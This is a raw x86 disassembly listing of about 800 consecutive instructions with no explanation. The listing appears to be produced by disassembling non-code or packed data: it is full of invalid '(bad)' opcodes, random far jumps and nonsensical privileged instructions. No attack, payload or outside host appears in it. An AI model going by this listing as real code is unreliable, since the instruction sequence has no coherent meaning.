  41e6d8:	jno    0x41e74d
  41e6da:	fimul  DWORD PTR [edi]
  41e6dc:	retf   
  41e6dd:	xlat   BYTE PTR ds:[ebx]
  41e6de:	pop    eax
  41e6df:	jmp    0x9c106280
  41e6e4:	sbb    DWORD PTR ds:0x43b45244,ebp
  41e6ea:	mov    ds:0xb40dda3,eax
  41e6ef:	fsubr  QWORD PTR [ebx-0x558d289d]
  41e6f5:	jnp    0x41e76d
  41e6f7:	arpl   cx,di
  41e6f9:	mov    esi,0x8a6db5c8
  41e6fe:	and    BYTE PTR [esi+0x79],ch
  41e701:	xor    edx,DWORD PTR [edx+0x29c29110]
  41e707:	int    0x2f
  41e709:	leave  
  41e70a:	pop    ds
  41e70b:	mov    ebx,0x2b5814ec
  41e710:	sub    BYTE PTR [edx],ah
  41e712:	jnp    0x41e6f7
  41e714:	pop    esi
  41e715:	data16 mov bh,0xb
  41e718:	push   0x9febfcbf
  41e71d:	jmp    0xb7e7:0xf1a3a1bd
  41e724:	mov    ah,BYTE PTR [esi+0x65]
  41e727:	push   es
  41e728:	sub    al,0xc5
  41e72a:	out    0x7c,al
  41e72c:	pop    esp
  41e72d:	hlt    
  41e72e:	pop    ebx
  41e72f:	(bad)  
  41e730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e731:	dec    edi
  41e732:	cs and al,0xc9
  41e735:	pop    edx
  41e736:	pop    esi
  41e737:	or     bl,BYTE PTR [esi-0x10780f85]
  41e73d:	(bad)  [ebx-0x7419bb02]
  41e743:	inc    eax
  41e744:	xor    al,BYTE PTR [ebx]
  41e746:	dec    ebp
  41e747:	(bad)  
  41e748:	adc    eax,0x2846513
  41e74d:	mov    ds:0xbfee7226,al
  41e752:	in     al,0x44
  41e754:	clc    
  41e755:	jmp    0x622f:0xef0ad918
  41e75c:	and    DWORD PTR [edi],0xfffffffa
  41e75f:	inc    ebx
  41e760:	sub    ch,BYTE PTR [edx-0x15]
  41e763:	jge    0x41e7ba
  41e765:	or     esp,ebp
  41e767:	and    bh,bl
  41e769:	repz mov ds:0xb4dc1b55,al
  41e76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e770:	ds fucomip st,st(3)
  41e773:	stos   DWORD PTR es:[edi],eax
  41e774:	sub    al,bl
  41e776:	lods   eax,DWORD PTR ds:[esi]
  41e777:	inc    esi
  41e778:	les    ebp,FWORD PTR [esi]
  41e77a:	adc    al,0x28
  41e77c:	cmp    ah,BYTE PTR [ecx+0x1bc6d4c4]
  41e782:	(bad)  
  41e784:	xchg   ebx,eax
  41e785:	add    al,0x9a
  41e787:	int    0xab
  41e789:	pop    es
  41e78a:	and    al,0xcc
  41e78c:	mov    edi,0xedbcc0df
  41e791:	push   esi
  41e792:	cli    
  41e793:	sub    DWORD PTR [eax],ebx
  41e795:	xchg   ebp,eax
  41e796:	jns    0x41e7ea
  41e798:	cdq    
  41e799:	add    eax,0x2c00df0d
  41e79e:	aaa    
  41e79f:	mov    al,ah
  41e7a1:	adc    edi,DWORD PTR [eax+eax*1+0x72563a88]
  41e7a8:	lock push edi
  41e7aa:	pusha  
  41e7ab:	ins    DWORD PTR es:[edi],dx
  41e7ac:	mov    ds:0xff786534,al
  41e7b1:	aaa    
  41e7b2:	sbb    DWORD PTR [ecx-0x450e75d8],ebx
  41e7b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7b9:	inc    eax
  41e7ba:	sub    eax,0x61865feb
  41e7bf:	hlt    
  41e7c0:	mov    ds:0x92e51ab5,al
  41e7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7c6:	sub    ebx,ebx
  41e7c8:	neg    BYTE PTR [ecx+0x7185e868]
  41e7ce:	xor    DWORD PTR [edx+0x1d],edi
  41e7d1:	pop    ebx
  41e7d2:	(bad)  
  41e7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7d4:	cli    
  41e7d5:	add    DWORD PTR [eax-0x25],edi
  41e7d8:	shl    DWORD PTR [esi+0x6],1
  41e7db:	neg    DWORD PTR [edx]
  41e7dd:	adc    DWORD PTR [ebx+0x79],ebp
  41e7e0:	pop    esi
  41e7e1:	std    
  41e7e2:	sbb    edi,0xffffffae
  41e7e5:	jns    0x41e790
  41e7e7:	or     eax,0x9985990b
  41e7ec:	xchg   BYTE PTR [edx+esi*1+0x5b15568d],al
  41e7f3:	pop    ebx
  41e7f4:	aas    
  41e7f5:	das    
  41e7f6:	cdq    
  41e7f7:	pop    edi
  41e7f8:	pop    ebp
  41e7f9:	outs   dx,DWORD PTR ds:[esi]
  41e7fa:	inc    edi
  41e7fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7fc:	test   al,0xfd
  41e7fe:	or     ecx,edx
  41e800:	nop
  41e801:	push   edi
  41e802:	mov    ecx,0xd0ad5838
  41e807:	jmp    0xb9c2:0xd47d2628
  41e80e:	mov    ds,WORD PTR [ecx+0x1e]
  41e811:	clc    
  41e812:	jbe    0x41e871
  41e814:	fld    QWORD PTR [eax-0x1a]
  41e817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e818:	xchg   ebp,eax
  41e819:	cmp    eax,0x2ff57582
  41e81e:	push   esi
  41e81f:	cmp    ecx,edx
  41e821:	jl     0x41e89c
  41e823:	adc    DWORD PTR [edi+0x2f],edi
  41e826:	dec    edx
  41e827:	int    0x11
  41e829:	stos   BYTE PTR es:[edi],al
  41e82a:	sub    eax,0xc0d3af55
  41e82f:	nop
  41e830:	cmp    BYTE PTR [edi+0x3c],dl
  41e833:	xor    DWORD PTR [ecx-0x20],edx
  41e836:	retf   0xfa9
  41e839:	xor    bl,dl
  41e83b:	sahf   
  41e83c:	(bad)  
  41e83d:	(bad)  [esi-0x6]
  41e840:	and    esi,DWORD PTR [eax-0x45]
  41e843:	mov    BYTE PTR [edx+0x85ae602],dh
  41e849:	int3   
  41e84a:	mov    cl,0x37
  41e84c:	in     eax,dx
  41e84d:	js     0x41e883
  41e84f:	out    0xbd,eax
  41e851:	jecxz  0x41e816
  41e853:	jne    0x41e8a6
  41e855:	mov    ecx,0xa4e199a7
  41e85a:	mov    edi,0x465a899d
  41e85f:	pop    esp
  41e860:	mov    bl,0xad
  41e862:	pop    eax
  41e863:	ret    0x84d8
  41e866:	sbb    BYTE PTR [ebx],0x4c
  41e869:	or     al,0x8b
  41e86b:	inc    esp
  41e86c:	mov    al,0xec
  41e86e:	adc    ch,ch
  41e870:	mov    ah,0xe1
  41e872:	add    DWORD PTR ds:0x13f8227b,edi
  41e878:	rol    ecx,1
  41e87a:	add    esi,DWORD PTR [edi+0x2f471c21]
  41e880:	mov    BYTE PTR [eax],0xf
  41e883:	xlat   BYTE PTR ds:[ebx]
  41e884:	and    eax,0x571a3bba
  41e889:	pop    edi
  41e88a:	inc    esi
  41e88b:	fist   WORD PTR [edx+0x568a9b0d]
  41e891:	mov    edx,0x4b3a0294
  41e896:	sbb    BYTE PTR [ebx+0x66],dh
  41e899:	pusha  
  41e89a:	aaa    
  41e89b:	imul   ecx,DWORD PTR [ebp+0x34],0xa
  41e89f:	pop    es
  41e8a0:	jo     0x41e8de
  41e8a2:	jb     0x41e8cf
  41e8a4:	das    
  41e8a5:	dec    edx
  41e8a6:	aad    0xd
  41e8a8:	xor    ebp,DWORD PTR ds:[eax+ebx*2-0x57]
  41e8ad:	mov    esp,DWORD PTR [ebp+0x71575684]
  41e8b3:	test   BYTE PTR [edi],0x1a
  41e8b6:	hlt    
  41e8b7:	pop    edi
  41e8b8:	(bad)  
  41e8b9:	out    dx,al
  41e8ba:	xchg   esi,eax
  41e8bb:	adc    edi,ebp
  41e8bd:	sub    DWORD PTR [ecx],esp
  41e8bf:	add    al,0x6
  41e8c1:	inc    ecx
  41e8c2:	ret    
  41e8c3:	clc    
  41e8c4:	dec    ecx
  41e8c5:	sub    ecx,ecx
  41e8c7:	stos   BYTE PTR es:[edi],al
  41e8c8:	xor    bh,BYTE PTR [ecx+0x604eeecf]
  41e8ce:	imul   ecx,DWORD PTR [ecx],0xb1957564
  41e8d4:	lds    ebx,FWORD PTR [edi]
  41e8d6:	sbb    eax,0xfba3f21f
  41e8db:	mov    ecx,0x43853cc6
  41e8e0:	stos   BYTE PTR es:[edi],al
  41e8e1:	adc    al,BYTE PTR [ecx-0x61]
  41e8e4:	ror    DWORD PTR [eax+0x25],0x31
  41e8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8e9:	mov    WORD PTR [ebx+0x62],?
  41e8ec:	sub    esp,DWORD PTR [ebx]
  41e8ee:	push   ds
  41e8ef:	cdq    
  41e8f0:	repnz inc eax
  41e8f2:	and    ch,cl
  41e8f4:	mov    WORD PTR [esi-0x59],ss
  41e8f7:	(bad)  [ecx]
  41e8f9:	out    0x98,eax
  41e8fb:	jmp    0x66a3:0x575c34e6
  41e902:	jecxz  0x41e94c
  41e904:	fld    DWORD PTR [eax-0x7a]
  41e907:	outs   dx,BYTE PTR ds:[esi]
  41e908:	dec    edx
  41e909:	xor    BYTE PTR [edx+0x1d],al
  41e90c:	ins    DWORD PTR es:[edi],dx
  41e90d:	(bad)  
  41e90e:	mov    ds:0xea8b8aeb,eax
  41e913:	ja     0x41e8a0
  41e915:	das    
  41e916:	imul   edx,DWORD PTR [esi],0x44
  41e919:	cmp    ah,BYTE PTR [ebx-0xf]
  41e91c:	or     cl,bl
  41e91e:	in     eax,0xa9
  41e920:	sbb    ebp,DWORD PTR [ecx]
  41e922:	imul   ebp,DWORD PTR [edi-0x34d6157f],0x784686d8
  41e92c:	xor    bh,ch
  41e92e:	xor    DWORD PTR [edi],0xffffffaa
  41e931:	nop
  41e932:	fidivr DWORD PTR [eax+0x4d]
  41e935:	adc    al,0x1e
  41e937:	push   0x273ad7d7
  41e93c:	and    ebx,DWORD PTR [edi]
  41e93e:	sub    al,0x5a
  41e940:	sub    DWORD PTR [ebp-0x5a],esi
  41e943:	leave  
  41e944:	mov    cl,0xc7
  41e946:	mov    edi,0x82e86fc0
  41e94b:	push   ds
  41e94c:	or     DWORD PTR [eax+ecx*2],0x1a
  41e950:	loope  0x41e9c8
  41e952:	adc    al,0x64
  41e954:	sub    eax,0xcc89f280
  41e959:	sub    cl,0xb
  41e95c:	jg     0x41e951
  41e95e:	cmp    al,0xfb
  41e960:	into   
  41e961:	stos   BYTE PTR es:[edi],al
  41e962:	ret    0xb7f3
  41e965:	(bad)  
  41e966:	nop
  41e967:	xchg   esi,eax
  41e968:	addr16 add al,0x7f
  41e96b:	xchg   esp,eax
  41e96c:	aaa    
  41e96d:	ds ja  0x41e9b9
  41e970:	inc    esp
  41e971:	push   esp
  41e972:	stc    
  41e973:	pop    eax
  41e974:	js     0x41e968
  41e976:	inc    ebx
  41e977:	aas    
  41e978:	sbb    DWORD PTR [eax+edx*8],eax
  41e97b:	xchg   edi,eax
  41e97c:	mov    ds:0xa6a686c4,al
  41e981:	clc    
  41e982:	in     eax,dx
  41e983:	js     0x41e99b
  41e985:	repnz xor al,0x1
  41e988:	sbb    ebp,DWORD PTR [ebp+0x1b]
  41e98b:	jo     0x41e9bc
  41e98d:	in     eax,dx
  41e98e:	lock push es
  41e990:	mov    bl,0x87
  41e992:	js     0x41e91d
  41e994:	retf   0xc718
  41e997:	mov    dh,0x17
  41e999:	sub    eax,0xfc4c1d4b
  41e99e:	(bad)  
  41e99f:	stos   BYTE PTR es:[edi],al
  41e9a0:	jp     0x41ea05
  41e9a2:	pop    ecx
  41e9a3:	in     al,dx
  41e9a4:	mov    ah,0xa5
  41e9a6:	mov    DWORD PTR [eax+0x2cd2b8c0],ebp
  41e9ac:	loope  0x41ea02
  41e9ae:	inc    ebp
  41e9af:	pop    edi
  41e9b0:	push   es
  41e9b1:	pop    edi
  41e9b2:	pushf  
  41e9b3:	fcom   QWORD PTR [eax-0x4a3600a3]
  41e9b9:	out    0xbc,eax
  41e9bb:	xchg   esi,eax
  41e9bc:	enter  0xf453,0x95
  41e9c0:	popa   
  41e9c1:	add    eax,0x6d14e583
  41e9c6:	int3   
  41e9c7:	iret   
  41e9c8:	adc    cl,0x55
  41e9cb:	lods   eax,DWORD PTR ds:[esi]
  41e9cc:	sbb    al,0x94
  41e9ce:	add    al,0xbb
  41e9d0:	(bad)  
  41e9d2:	mov    ds:0x5a23b603,eax
  41e9d7:	fs iret 
  41e9d9:	mov    DWORD PTR [esi+ebx*2],edx
  41e9dc:	std    
  41e9dd:	push   edx
  41e9de:	fdiv   st,st(7)
  41e9e0:	add    DWORD PTR [eax],0xffffffb8
  41e9e3:	mov    WORD PTR [edx],?
  41e9e5:	(bad)  
  41e9e6:	push   ss
  41e9e7:	inc    esp
  41e9e8:	jecxz  0x41e98a
  41e9ea:	xor    bl,BYTE PTR [ecx]
  41e9ec:	adc    ebp,DWORD PTR [ebp+0x2db72efb]
  41e9f2:	int3   
  41e9f3:	jno    0x41ea19
  41e9f5:	mov    edi,0x9005f0c7
  41e9fa:	sbb    ch,ch
  41e9fc:	jo     0x41e980
  41e9fe:	push   ds
  41e9ff:	scas   al,BYTE PTR es:[edi]
  41ea00:	cld    
  41ea01:	adc    ch,BYTE PTR [ebx+ecx*1+0x5d38490f]
  41ea08:	jge    0x41e9c9
  41ea0a:	rcl    BYTE PTR [ecx-0x654a7f3],cl
  41ea10:	pop    ds
  41ea11:	push   esp
  41ea12:	sub    esp,edi
  41ea14:	jno    0x41ea59
  41ea16:	dec    BYTE PTR [ecx+0x77]
  41ea19:	out    dx,al
  41ea1a:	and    DWORD PTR [edx],edi
  41ea1c:	adc    bh,BYTE PTR [ecx]
  41ea1e:	jo     0x41e9e2
  41ea20:	xchg   edx,eax
  41ea21:	fiadd  WORD PTR [ebx]
  41ea23:	scas   al,BYTE PTR es:[edi]
  41ea24:	xchg   esi,eax
  41ea25:	mov    ecx,0x2624503a
  41ea2a:	loope  0x41ea5d
  41ea2c:	push   esi
  41ea2d:	fidivr WORD PTR [edi-0x5bb6c2da]
  41ea33:	enter  0xc,0x77
  41ea37:	daa    
  41ea38:	mov    DWORD PTR [edi],esp
  41ea3a:	enter  0xceba,0x9
  41ea3e:	addr16 aas 
  41ea40:	push   cs
  41ea41:	pop    esp
  41ea42:	(bad)  
  41ea45:	loop   0x41ea28
  41ea47:	out    dx,al
  41ea48:	cwde   
  41ea49:	fs sbb esp,esi
  41ea4c:	jp     0x41ea73
  41ea4e:	test   al,0x75
  41ea50:	and    al,0xd7
  41ea52:	loopne 0x41eab4
  41ea54:	adc    al,0x56
  41ea56:	fidivr DWORD PTR [eax-0x24]
  41ea59:	xchg   cl,bh
  41ea5b:	mov    eax,DWORD PTR [edx-0x5327978d]
  41ea61:	jno    0x41ea05
  41ea63:	xchg   esp,eax
  41ea64:	xor    cl,BYTE PTR [edi-0x4d25c91d]
  41ea6a:	dec    ecx
  41ea6b:	shl    BYTE PTR [esi+edx*8+0x7a],0x1c
  41ea70:	in     eax,dx
  41ea71:	or     DWORD PTR [edx-0xc],0xfffffff1
  41ea75:	adc    al,0xf6
  41ea77:	imul   edx,DWORD PTR [eax-0x69],0xb821e31d
  41ea7e:	pushf  
  41ea7f:	arpl   WORD PTR [eax],ax
  41ea81:	aaa    
  41ea82:	xchg   ebp,ebx
  41ea84:	cld    
  41ea85:	call   0x5811:0x265f4120
  41ea8c:	ja     0x41ea96
  41ea8e:	dec    edx
  41ea8f:	ins    BYTE PTR es:[edi],dx
  41ea90:	or     dl,BYTE PTR [ecx-0x5ff49305]
  41ea96:	adc    esi,ebx
  41ea98:	(bad)
  41ea9d:	push   esi
  41ea9e:	dec    ebp
  41ea9f:	adc    DWORD PTR [esi],0xffffffb7
  41eaa2:	fdivr  QWORD PTR [ebx-0x2ab7b506]
  41eaa8:	fcom   DWORD PTR [esi+0x34df9bfd]
  41eaae:	scas   al,BYTE PTR es:[edi]
  41eaaf:	mov    eax,ds:0x70722528
  41eab4:	aaa    
  41eab5:	push   esp
  41eab6:	sar    DWORD PTR [edi-0x15892046],cl
  41eabc:	inc    esi
  41eabd:	mov    ebp,0x87476f39
  41eac2:	mov    edi,0x992998f2
  41eac7:	mov    ds:0x9096916a,eax
  41eacc:	out    dx,eax
  41eacd:	sbb    al,0xd5
  41eacf:	push   eax
  41ead0:	ins    DWORD PTR es:[edi],dx
  41ead1:	push   edi
  41ead2:	addr16 and al,0xa8
  41ead5:	daa    
  41ead6:	nop
  41ead7:	dec    edi
  41ead8:	mov    al,ds:0xc6b026a5
  41eadd:	and    DWORD PTR [ecx+edx*4-0x66],ecx
  41eae1:	ins    DWORD PTR es:[edi],dx
  41eae2:	call   0xae48:0xffd6fb49
  41eae9:	push   ebx
  41eaea:	adc    ebp,esi
  41eaec:	sub    al,0x17
  41eaee:	jno    0x41eadd
  41eaf0:	dec    esi
  41eaf1:	out    dx,al
  41eaf2:	aas    
  41eaf3:	retf   0xba8e
  41eaf6:	mov    esi,0xcec136ee
  41eafb:	aaa    
  41eafc:	or     eax,0x4fa82cd0
  41eb01:	ja     0x41eb5a
  41eb03:	xor    bh,BYTE PTR [edi-0x559c8376]
  41eb09:	inc    edx
  41eb0a:	jecxz  0x41eb7e
  41eb0c:	sbb    BYTE PTR [edi],dl
  41eb0e:	pop    es
  41eb0f:	inc    eax
  41eb10:	mov    al,ds:0x9bc7c52
  41eb15:	and    bh,BYTE PTR [edx-0x673303ce]
  41eb1b:	push   es
  41eb1c:	sub    eax,0xfda8a6ec
  41eb21:	les    edi,FWORD PTR [ebp-0x1b59038f]
  41eb27:	cmp    eax,0x56bac348
  41eb2c:	pop    ss
  41eb2d:	in     al,dx
  41eb2e:	sar    dl,0x95
  41eb31:	sub    eax,0xd037743e
  41eb36:	inc    ebp
  41eb37:	cmp    BYTE PTR [edx-0x22a7ee59],dl
  41eb3d:	sbb    edi,eax
  41eb3f:	xor    al,0x53
  41eb41:	sbb    al,0xbd
  41eb43:	loop   0x41eb3e
  41eb45:	xchg   DWORD PTR [edx+0x44],ebp
  41eb48:	mov    ecx,0x31312bbd
  41eb4d:	fstp   QWORD PTR ds:0x1dc6372e
  41eb53:	ins    BYTE PTR es:[edi],dx
  41eb54:	ror    DWORD PTR [ebp+0xcec3d49],1
  41eb5a:	inc    ecx
  41eb5b:	push   esp
  41eb5c:	jle    0x41eb4b
  41eb5e:	sub    edx,edx
  41eb60:	sbb    BYTE PTR [edx+0x58cc2bcf],dl
  41eb66:	pop    ss
  41eb67:	jmp    0x48b2:0xee45ccb5
  41eb6e:	retf   
  41eb6f:	push   es
  41eb70:	jb     0x41eb07
  41eb72:	shl    BYTE PTR [edx-0x5981c0a9],1
  41eb78:	sbb    edx,DWORD PTR [ebx+0x271dcfab]
  41eb7e:	int    0xce
  41eb80:	arpl   WORD PTR [eax],bp
  41eb82:	mov    dl,0x56
  41eb84:	inc    esi
  41eb85:	hlt    
  41eb86:	arpl   WORD PTR [ebp-0x4b],cx
  41eb89:	inc    edx
  41eb8a:	adc    ebp,esp
  41eb8c:	pop    ss
  41eb8d:	sbb    eax,0x25b2b4ef
  41eb92:	lahf   
  41eb93:	push   ebx
  41eb94:	lahf   
  41eb95:	fbstp  TBYTE PTR [edi-0x233e9dda]
  41eb9b:	in     eax,dx
  41eb9c:	fcomp  st(3)
  41eb9e:	xchg   ebx,eax
  41eb9f:	push   ss
  41eba0:	or     DWORD PTR [ebx],0x1b
  41eba3:	dec    esp
  41eba4:	pop    ebx
  41eba5:	adc    al,0x10
  41eba7:	out    0x27,al
  41eba9:	dec    edi
  41ebaa:	popf   
  41ebab:	pop    ds
  41ebac:	arpl   WORD PTR [esi+ecx*1+0x73d0693a],di
  41ebb3:	push   ecx
  41ebb4:	aas    
  41ebb5:	retf   
  41ebb6:	add    al,0x57
  41ebb8:	sbb    bh,BYTE PTR [edx-0x50]
  41ebbb:	jge    0x41ec10
  41ebbd:	mov    dl,0x31
  41ebbf:	retf   0x9aff
  41ebc2:	dec    esi
  41ebc3:	xchg   esi,eax
  41ebc4:	push   esi
  41ebc5:	inc    eax
  41ebc6:	daa    
  41ebc7:	mov    ds:0xe72dd2d7,eax
  41ebcc:	fdivr  st(4),st
  41ebce:	dec    edx
  41ebcf:	jmp    0x41eb91
  41ebd1:	mov    al,0xdd
  41ebd3:	mov    bl,0xa1
  41ebd5:	pop    ecx
  41ebd6:	(bad)  
  41ebd7:	shl    BYTE PTR [eax-0x3d3c15ab],cl
  41ebdd:	push   edx
  41ebde:	jo     0x41ec57
  41ebe0:	fbld   TBYTE PTR [esi+edx*1-0x7f12f149]
  41ebe7:	xchg   edi,eax
  41ebe8:	lock je 0x41ec11
  41ebeb:	push   ebp
  41ebec:	fnsave [ecx]
  41ebee:	(bad)  
  41ebef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebf0:	cmp    eax,0xaaaff432
  41ebf5:	loope  0x41ec1d
  41ebf7:	xchg   ebx,eax
  41ebf8:	mov    ds:0x17ed4c00,eax
  41ebfd:	push   ds
  41ebfe:	test   al,0x3c
  41ec00:	push   ebx
  41ec01:	xor    edi,ebx
  41ec03:	and    BYTE PTR [ecx+edi*4+0x6e],0x21
  41ec08:	dec    ebp
  41ec09:	mov    ebx,0x325d9ad4
  41ec0e:	int    0xf
  41ec10:	add    cl,ah
  41ec12:	push   esi
  41ec13:	rol    ah,cl
  41ec15:	xchg   edx,eax
  41ec16:	push   edx
  41ec17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec18:	jl     0x41ec29
  41ec1a:	shl    esi,0x7c
  41ec1d:	les    edi,FWORD PTR [edi+0x737c8c81]
  41ec23:	or     bl,BYTE PTR [ecx]
  41ec25:	pusha  
  41ec26:	adc    edi,0x47
  41ec29:	pop    ecx
  41ec2a:	dec    esp
  41ec2b:	push   esp
  41ec2c:	ficom  WORD PTR [edi-0x67]
  41ec2f:	in     eax,dx
  41ec30:	xor    al,0xe1
  41ec32:	push   eax
  41ec33:	pusha  
  41ec34:	or     BYTE PTR [edi+edi*2-0x6a],ah
  41ec38:	cmp    al,0x44
  41ec3a:	aas    
  41ec3b:	adc    eax,0xcb4708c4
  41ec40:	lahf   
  41ec41:	jl     0x41ebc4
  41ec43:	(bad)  
  41ec45:	add    eax,0xff751b77
  41ec4a:	push   0xfc11bf7a
  41ec4f:	dec    ebx
  41ec50:	dec    edi
  41ec51:	ins    BYTE PTR es:[edi],dx
  41ec52:	mov    dh,0x9f
  41ec54:	out    0x6d,al
  41ec56:	jmp    FWORD PTR [ecx+0x292e5a42]
  41ec5c:	cld    
  41ec5d:	rol    ch,cl
  41ec5f:	push   ss
  41ec60:	adc    dh,al
  41ec62:	fs add al,0x8f
  41ec65:	pop    es
  41ec66:	push   ecx
  41ec67:	add    DWORD PTR [eax+0x1e548193],eax
  41ec6d:	sbb    dl,BYTE PTR [ecx]
  41ec6f:	jmp    0x395a:0x5cda6691
  41ec76:	sbb    ah,dh
  41ec78:	cld    
  41ec79:	cld    
  41ec7a:	cwde   
  41ec7b:	pcmpgtd mm0,QWORD PTR [edx-0x3b]
  41ec7f:	loope  0x41ec0b
  41ec81:	ins    BYTE PTR es:[edi],dx
  41ec82:	bound  edi,QWORD PTR [ebx+edi*4-0x4af3c40b]
  41ec89:	out    dx,eax
  41ec8a:	out    dx,eax
  41ec8b:	scas   al,BYTE PTR es:[edi]
  41ec8c:	xchg   ebx,eax
  41ec8d:	in     al,0x33
  41ec8f:	in     al,dx
  41ec90:	jae    0x41ec1d
  41ec92:	repz into 
  41ec94:	inc    edi
  41ec95:	cld    
  41ec96:	mov    edx,esp
  41ec98:	idiv   ecx
  41ec9a:	sbb    eax,0xd78bf93f
  41ec9f:	dec    edi
  41eca0:	cmp    cl,cl
  41eca2:	jae    0x41ec3a
  41eca4:	mov    ds:0x63a2d791,al
  41eca9:	dec    edx
  41ecaa:	ins    DWORD PTR es:[edi],dx
  41ecab:	icebp  
  41ecac:	sbb    DWORD PTR [edx+0xc],0xffffffae
  41ecb0:	neg    DWORD PTR ds:0xa25b198e
  41ecb6:	lahf   
  41ecb7:	(bad)  
  41ecb8:	sbb    DWORD PTR [ebp-0x670dc929],ebp
  41ecbe:	adc    al,0xf7
  41ecc0:	dec    eax
  41ecc1:	js     0x41ecc1
  41ecc3:	call   0x57c4:0x19c6affb
  41ecca:	fsub   st(3),st
  41eccc:	or     ebx,DWORD PTR [edi]
  41ecce:	inc    eax
  41eccf:	(bad)  
  41ecd0:	nop
  41ecd1:	mov    esi,0xd3d5af2e
  41ecd6:	sbb    ecx,DWORD PTR [edx]
  41ecd8:	mov    ds:0x995f8fad,eax
  41ecdd:	loope  0x41ecfb
  41ecdf:	xor    BYTE PTR [ecx+0x43],0x5b
  41ece3:	dec    edi
  41ece4:	adc    DWORD PTR [edi],0xfffffff1
  41ece7:	mov    edx,0xa0247e9f
  41ecec:	scas   al,BYTE PTR es:[edi]
  41eced:	fnstcw WORD PTR [ecx]
  41ecef:	(bad)  
  41ecf0:	xchg   edi,eax
  41ecf1:	inc    ecx
  41ecf2:	dec    esp
  41ecf3:	sub    esi,esp
  41ecf5:	daa    
  41ecf6:	xchg   esi,eax
  41ecf7:	loope  0x41ecfa
  41ecf9:	adc    eax,0x361d94fc
  41ecfe:	pop    esp
  41ecff:	fstp   TBYTE PTR [ebp-0x25440add]
  41ed05:	imul   esp,DWORD PTR [eiz*1-0x2b9f8ec4],0x4f145fe4
  41ed10:	or     ch,ch
  41ed12:	xchg   edi,eax
  41ed13:	mov    dh,0xe8
  41ed15:	loop   0x41ed19
  41ed17:	inc    ecx
  41ed18:	xor    eax,DWORD PTR [ecx+esi*8+0x3]
  41ed1c:	fbstp  TBYTE PTR ss:[esi-0x4]
  41ed20:	fsubr  DWORD PTR [edx]
  41ed22:	(bad)  [ebx+eiz*8-0x80]
  41ed26:	sub    al,BYTE PTR [edx]
  41ed28:	pop    edx
  41ed29:	and    eax,0x4346ee
  41ed2e:	adc    ah,BYTE PTR [esi+ecx*4-0x15]
  41ed32:	ins    BYTE PTR es:[edi],dx
  41ed33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed34:	das    
  41ed35:	cmp    ah,BYTE PTR [eax+eiz*8-0x3d]
  41ed39:	jecxz  0x41ed7d
  41ed3b:	inc    edx
  41ed3c:	inc    ebp
  41ed3d:	sbb    DWORD PTR [ecx],ecx
  41ed3f:	adc    dh,BYTE PTR [ebx]
  41ed41:	sbb    ebx,DWORD PTR [eax+0x25]
  41ed44:	jp     0x41ed00
  41ed46:	sub    al,0x1c
  41ed48:	dec    ecx
  41ed49:	ss pop eax
  41ed4b:	dec    eax
  41ed4c:	sbb    dh,BYTE PTR [eax]
  41ed4e:	pop    es
  41ed4f:	out    dx,eax
  41ed50:	popa   
  41ed51:	adc    esp,DWORD PTR [ebx-0x6f]
  41ed54:	pop    eax
  41ed55:	test   al,0x87
  41ed57:	adc    dh,BYTE PTR [eax+0x17eda869]
  41ed5d:	push   ebp
  41ed5e:	(bad)  [edx]
  41ed60:	call   0xff274d66
  41ed65:	mov    edi,edi
  41ed67:	inc    edx
  41ed68:	mov    ch,0x94
  41ed6a:	neg    BYTE PTR [edi+0x769b6333]
  41ed70:	outs   dx,BYTE PTR ds:[esi]
  41ed71:	jp     0x41ecfa
  41ed73:	cwde   
  41ed74:	dec    ebx
  41ed75:	jno    0x41edde
  41ed77:	in     al,dx
  41ed78:	sub    eax,0xad3f6af3
  41ed7d:	jo     0x41ed08
  41ed7f:	je     0x41edf2
  41ed81:	imul   eax,DWORD PTR [esi+0x38],0xffffffa9
  41ed85:	push   edx
  41ed86:	stos   DWORD PTR es:[edi],eax
  41ed87:	ja     0x41ed73
  41ed89:	into   
  41ed8a:	leave  
  41ed8b:	xor    ebx,DWORD PTR [esi+0x70d419e2]
  41ed91:	mov    eax,DWORD PTR [eax+0x6c3704aa]
  41ed97:	push   cs
  41ed98:	and    BYTE PTR [eax+0x1c16e93e],dl
  41ed9e:	sbb    ebp,DWORD PTR [edi-0x60]
  41eda1:	sahf   
  41eda2:	jb     0x41ed91
  41eda4:	push   eax
  41eda5:	sbb    cl,dh
  41eda7:	(bad)  
  41eda8:	sub    al,0xe1
  41edaa:	sub    al,0x73
  41edac:	sub    DWORD PTR [esi-0x655d1a39],ebp
  41edb2:	inc    ebx
  41edb3:	iret   
  41edb4:	jns    0x41edfc
  41edb6:	sbb    al,dh
  41edb8:	and    DWORD PTR [ebx+ecx*4-0x1bb3656],0xffffffaa
  41edc0:	pop    esp
  41edc1:	sub    ebx,ecx
  41edc3:	cdq    
  41edc4:	fs popa 
  41edc6:	fst    DWORD PTR [ebx+esi*2-0x61]
  41edca:	xchg   DWORD PTR [esi-0x35511186],edi
  41edd0:	mov    dh,0xf8
  41edd2:	add    cl,dl
  41edd4:	sti    
  41edd5:	fisubr DWORD PTR [edi-0x7f]
  41edd8:	jbe    0x41ee51
  41edda:	or     dh,BYTE PTR [ebx+0x1513b66f]
  41ede0:	arpl   si,bp
  41ede2:	dec    eax
  41ede3:	fsubr  DWORD PTR [eax+0x1f]
  41ede6:	(bad)  
  41ede7:	mov    bh,0xfc
  41ede9:	repz aaa 
  41edeb:	aam    0x5b
  41eded:	popa   
  41edee:	adc    dl,bh
  41edf0:	scas   al,BYTE PTR es:[edi]
  41edf1:	sar    BYTE PTR [eax],1
  41edf3:	lahf   
  41edf4:	lods   al,BYTE PTR ds:[esi]
  41edf5:	pop    edi
  41edf6:	mov    esp,0xa50ad8f2
  41edfb:	sbb    DWORD PTR [ebp+0x7371eeee],ecx
  41ee01:	inc    ecx
  41ee02:	xchg   ebx,eax
  41ee03:	dec    eax
  41ee04:	hlt    
